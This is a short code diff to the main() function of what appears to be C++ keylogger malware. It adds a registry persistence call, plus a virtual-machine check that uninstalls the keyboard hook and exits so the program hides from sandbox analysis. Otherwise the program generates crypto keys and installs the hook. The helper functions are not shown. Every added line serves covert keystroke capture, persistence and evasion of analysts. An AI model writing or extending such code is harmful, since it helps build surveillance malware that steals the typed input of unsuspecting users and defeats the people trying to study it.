@@ -8,9 +8,16 @@
 
 int main() {
 #ifdef DEBUG_BUILD
+  Sys::AddToRegistry();
 #endif
 
 #ifndef DEBUG_BUILD
+  if (Sys::CheckForVirtualMachine()) {
+	KeyHook::UninstallHook();
+	KeyHook::KillProcess();
+	return 0;
+  }
+
   Crypt::GenerateKeys();
   KeyHook::InstallHook();
 
